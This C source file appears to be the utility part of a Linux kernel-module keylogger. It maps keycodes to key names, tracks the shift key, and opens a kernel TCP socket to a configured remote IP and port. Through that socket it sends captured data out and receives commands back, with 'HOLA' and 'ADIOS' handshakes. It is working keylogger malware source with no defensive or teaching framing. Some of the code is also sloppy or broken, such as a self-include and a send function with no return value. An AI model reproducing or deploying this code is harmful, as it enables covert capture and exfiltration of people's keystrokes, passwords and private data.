#ifndef KL_UTILS_H
#define KL_UTILS_H

#include "kl_utils.h"

uint8_t shift_pressed = 0;
struct socket *conn_socket = NULL;
char server_buffer[10];

bool isShift(uint16_t code) {
   	return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

char *getKeyText(uint16_t code) {

   char **arr;
   if (shift_pressed != 0) {
      arr = shift_key_names;
   } else {
      arr = key_names;
   }

   return arr[code];
}

int send_data(const char* buffer, const size_t length){
	tcp_client_send(conn_socket, buffer, strlen(buffer), MSG_DONTWAIT);
}

int tcp_client_send(struct socket *sock, const char *buf, const size_t length, unsigned long flags)
{
        struct msghdr msg;
        struct kvec vec;
        int len, written = 0, left = length;
        mm_segment_t oldmm;

        msg.msg_name    = 0;
        msg.msg_namelen = 0;
        msg.msg_control = NULL;
        msg.msg_controllen = 0;
        msg.msg_flags   = flags;

        oldmm = get_fs(); set_fs(KERNEL_DS);
repeat_send:

        vec.iov_len = left;
        vec.iov_base = (char *)buf + written;

        len = kernel_sendmsg(sock, &msg, &vec, left, left);
        if((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) && (len == -EAGAIN)))
                goto repeat_send;
        if(len > 0)
        {
                written += len;
                left -= len;
                if(left)
                        goto repeat_send;
        }
        set_fs(oldmm);
        return written ? written:len;
}

int receive_cmd(char* buffer){
	return tcp_client_receive(conn_socket, buffer, MSG_WAITALL);
}

int tcp_client_receive(struct socket *sock, char *str, unsigned long flags)
{
        struct msghdr msg;
        struct kvec vec;
        int len;
        int max_size = 1;

        msg.msg_name    = 0;
        msg.msg_namelen = 0;
        msg.msg_control = NULL;
        msg.msg_controllen = 0;
        msg.msg_flags   = flags;
        vec.iov_len = max_size;
        vec.iov_base = str;
read_again:
		//printk(KERN_INFO "1) Buffer in rcv: %s", str);
        len = kernel_recvmsg(sock, &msg, &vec, max_size, max_size, flags);

        //printk(KERN_INFO "2) Buffer in rcv: %s", str);

        if(len == -EAGAIN || len == -ERESTARTSYS)
        {
                //pr_info(" *** mtp | error while reading: %d | "
                //        "tcp_client_receive *** \n", len);

                goto read_again;
        }


        //pr_info(" *** mtp | the server says: %s | tcp_client_receive *** \n", str);
        return len;
}

int tcp_client_connect(void)
{
        struct sockaddr_in saddr;
        unsigned char destip[5] = {127,0,0,1,'\0'};
        int len = 49;
        char response[len+1];
        char reply[len+1];
        int ret = -1;

        DECLARE_WAIT_QUEUE_HEAD(recv_wait);
        
        ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
        if(ret < 0)
        {
                //pr_info(" Error: %d while creating first socket\n", ret);
                return -1;
        }

        memset(&saddr, 0, sizeof(saddr));
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(PORT);
        saddr.sin_addr.s_addr = in_aton(REMOTE_IP);

        ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&saddr, sizeof(saddr), O_RDWR);
        if(ret && (ret != -EINPROGRESS))
        {
                //pr_info("Error: %d while connecting using conn\n", ret);
                return -1;
        }

        memset(&reply, 0, len+1);
        strcat(reply, "HOLA"); 
        tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);

        wait_event_timeout(recv_wait, !skb_queue_empty(&conn_socket->sk->sk_receive_queue), 5*HZ);
                if(!skb_queue_empty(&conn_socket->sk->sk_receive_queue))
                {
                        memset(&response, 0, len+1);
                        tcp_client_receive(conn_socket, response, MSG_DONTWAIT);
                      
                }
        
}

void close_client(void)
{
        int len = 49;
        char response[len+1];
        char reply[len+1];

        DECLARE_WAIT_QUEUE_HEAD(exit_wait);

        memset(&reply, 0, len+1);
        strcat(reply, "ADIOS"); 
        tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);

        wait_event_timeout(exit_wait,!skb_queue_empty(&conn_socket->sk->sk_receive_queue), 5*HZ);
        if(!skb_queue_empty(&conn_socket->sk->sk_receive_queue))
        {
                memset(&response, 0, len+1);
                tcp_client_receive(conn_socket, response, MSG_DONTWAIT);
        }

        if(conn_socket != NULL)
        {
                sock_release(conn_socket);
        }
        //pr_info(" *** mtp | network client exiting | network_client_exit *** \n");
}


#endif